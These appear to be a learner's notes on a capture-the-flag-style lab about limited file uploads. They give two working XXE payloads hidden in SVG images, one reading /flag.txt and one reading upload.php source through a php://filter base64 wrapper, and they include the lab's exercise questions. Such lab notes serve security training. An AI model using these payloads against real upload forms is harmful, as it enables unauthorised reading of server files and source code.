# [Limited File Uploads](Limited%20File%20Uploads.md)
### The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"

```shell
echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]><svg width="100" height="100"><circle cx="50" cy="50" r="40" fill="blue" />&xxe;</svg>' > exploit.svg
```
![](Screenshot%202026-07-12%20at%2014.09.33.png)
![](Screenshot%202026-07-12%20at%2014.09.51.png)
### Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)

```shell
echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]><svg width="100" height="100">&xxe;</svg>' > read_source.svg
```
![](Screenshot%202026-07-12%20at%2014.23.44.png)

```shell
echo "base64" | base64 -d
```
![](Screenshot%202026-07-12%20at%2014.24.17.png)
